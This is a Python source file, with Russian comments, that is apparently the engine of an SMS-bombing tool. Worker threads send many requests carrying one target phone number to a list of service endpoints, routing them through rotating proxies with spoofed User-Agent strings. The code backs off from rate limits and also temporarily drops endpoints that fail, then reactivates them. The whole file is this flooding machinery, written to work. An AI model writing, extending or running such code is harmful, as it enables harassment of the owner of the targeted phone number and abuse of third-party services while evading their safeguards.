# core2.py — усиленный движок: автобан, регенерация, дедуп
# Python 3.10+, requests
import random
import threading
import time
import urllib.parse
from dataclasses import dataclass, field

import requests


@dataclass
class Endpoint:
    name: str
    url: str
    method: str = "POST"
    body: str = '{"phone":"{phone}"}'
    headers: dict = field(default_factory=dict)
    body_type: str = "json"
    profile: str = "fast"
    strikes: int = 0
    banned_until: float = 0.0
    last_ok: float = 0.0
    last_fail: float = 0.0


class Registry:
    def __init__(self, threshold: int = 3, ban_sec: float = 180.0,
                 max_ban_sec: float = 3600.0):
        self._threshold = threshold
        self._ban = ban_sec
        self._max_ban = max_ban_sec
        self._eps: dict[str, Endpoint] = {}
        self._lock = threading.Lock()
        self.stats = {"ok": 0, "fail": 0, "flood": 0, "banned": 0, "regen": 0}

    def add(self, ep: Endpoint) -> None:
        with self._lock:
            self._eps[ep.name] = ep

    def all(self) -> list[Endpoint]:
        with self._lock:
            return list(self._eps.values())

    def alive(self) -> list[Endpoint]:
        now = time.monotonic()
        with self._lock:
            return [ep for ep in self._eps.values()
                    if now >= ep.banned_until and ep.last_fail <= ep.last_ok]

    def ok(self, ep: Endpoint) -> None:
        with self._lock:
            ep.strikes = 0
            ep.last_ok = time.monotonic()
            self.stats["ok"] += 1

    def fail(self, ep: Endpoint) -> None:
        with self._lock:
            ep.strikes += 1
            ep.last_fail = time.monotonic()
            self.stats["fail"] += 1
            if ep.strikes >= self._threshold:
                ban = min(self._max_ban, self._ban * (2 ** (ep.strikes - self._threshold)))
                ep.banned_until = time.monotonic() + ban
                self.stats["banned"] += 1
                ep.strikes = 0

    def flood(self, ep: Endpoint, retry_after: float | None) -> float:
        with self._lock:
            self.stats["flood"] += 1
            pause = (retry_after or 5.0) + random.uniform(0, 1.0)
            ep.banned_until = time.monotonic() + pause
            return pause

    def regen(self) -> None:
        now = time.monotonic()
        with self._lock:
            for ep in self._eps.values():
                if ep.banned_until and now >= ep.banned_until:
                    ep.banned_until = 0.0
                    ep.strikes = 0
                    self.stats["regen"] += 1

    def snapshot(self) -> dict:
        with self._lock:
            now = time.monotonic()
            live = sum(1 for ep in self._eps.values() if now >= ep.banned_until)
            return {"total": len(self._eps), "live": live, **self.stats}


class Limiter:
    def __init__(self, start_rps=30.0, min_rps=2.0, max_rps=100.0):
        self._rps, self._min, self._max = start_rps, min_rps, max_rps
        self._lock = threading.Lock()
        self._next_at = 0.0

    @property
    def rps(self) -> float:
        with self._lock:
            return self._rps

    def wait(self) -> None:
        with self._lock:
            now = time.monotonic()
            delay = max(0.0, self._next_at - now)
            self._next_at = max(now, self._next_at) + 1.0 / self._rps
        if delay > 0:
            time.sleep(delay)

    def on_flood(self, retry_after: float | None) -> float:
        with self._lock:
            self._rps = max(self._min, self._rps * 0.6)
            pause = (retry_after or (2.0 / self._rps)) + random.uniform(0, 0.3)
            self._next_at = time.monotonic() + pause
        return pause

    def on_ok(self) -> None:
        with self._lock:
            self._rps = min(self._max, self._rps * 1.01)


class Engine:
    def __init__(self, registry: Registry, proxies: list[str], workers: int = 16,
                 limiter: Limiter | None = None):
        self._registry = registry
        self._proxies = proxies
        self._workers = workers
        self._limiter = limiter or Limiter()
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._seen: set[str] = set()
        self.sent = 0
        self.flood = 0
        self.failed = 0
        self.dedup = 0

    def stop(self) -> None:
        self._stop.set()

    def _pick_proxy(self):
        if not self._proxies:
            return None
        p = random.choice(self._proxies)
        return {"http": p, "https": p}

    def _payload(self, ep: Endpoint, phone: str):
        raw = ep.body.format(phone=phone)
        hdrs = {"User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
            "Mozilla/5.0 (Android 14; Mobile; rv:120.0)",
        ]), **ep.headers}
        if ep.body_type == "json":
            hdrs["Content-Type"] = "application/json"
            return raw.encode(), hdrs
        if ep.body_type == "form":
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            return raw.encode(), hdrs
        return dict(urllib.parse.parse_qsl(raw)), hdrs

    def _fire(self, ep: Endpoint, phone: str, s: requests.Session):
        data, hdrs = self._payload(ep, phone)
        try:
            r = s.request(ep.method, ep.url, data=data, headers=hdrs,
                          timeout=5, proxies=self._pick_proxy())
            if r.status_code == 429:
                ra = r.headers.get("Retry-After")
                return "flood", float(ra) if ra and ra.replace(".", "").isdigit() else None
            if 200 <= r.status_code < 300:
                return "ok", None
            return "fail", None
        except requests.RequestException:
            return "fail", None

    def _worker(self, phone: str, rounds: int) -> None:
        with requests.Session() as s:
            for _ in range(rounds):
                if self._stop.is_set():
                    return
                live = self._registry.alive()
                if not live:
                    time.sleep(1.0)
                    continue
                for ep in live:
                    if self._stop.is_set():
                        return
                    key = f"{ep.name}:{phone}"
                    with self._lock:
                        if key in self._seen:
                            self.dedup += 1
                            continue
                        self._seen.add(key)
                    self._limiter.wait()
                    kind, ra = self._fire(ep, phone, s)
                    if kind == "ok":
                        self._registry.ok(ep)
                        with self._lock:
                            self.sent += 1
                        self._limiter.on_ok()
                    elif kind == "flood":
                        pause = self._registry.flood(ep, ra)
                        with self._lock:
                            self.flood += 1
                        time.sleep(pause)
                    else:
                        self._registry.fail(ep)
                        with self._lock:
                            self.failed += 1

    def run(self, phone: str, rounds: int) -> None:
        self._registry.regen()
        threads = [threading.Thread(target=self._worker, args=(phone, rounds),
                                    daemon=True) for _ in range(self._workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def report(self) -> dict:
        return {"sent": self.sent, "flood": self.flood,
                "failed": self.failed, "dedup": self.dedup,
                "rps": round(self._limiter.rps, 2),
                "registry": self._registry.snapshot()}
